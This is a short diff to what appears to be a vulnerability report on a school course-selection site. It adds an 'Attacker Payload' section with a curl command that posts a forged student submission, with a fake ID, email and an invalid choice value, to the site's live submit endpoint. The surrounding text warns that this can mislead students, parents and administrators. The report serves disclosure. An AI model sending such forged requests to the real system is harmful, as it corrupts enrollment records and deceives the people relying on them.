@@ -20,6 +20,12 @@
 - 確認信可能寄到錯誤或被偽造的目標，造成學生與家長誤解
 - 教務處若只看系統名單，可能做出錯誤行政判斷
 
+## Attacker Payload
+
+```bash
+curl -X POST --data '{"name": "test", "student_id": "1234", "email": "1234@school.domain.tp.edu.tw", "choice": "-1", "submit_time": "2026-04-06T10:42:41.284Z"}' -H "Content-type: application/json" https://select.fhsh.taipei/submit
+```
+
 ## Source Evidence
 
 - `backend/main.py:92-143`
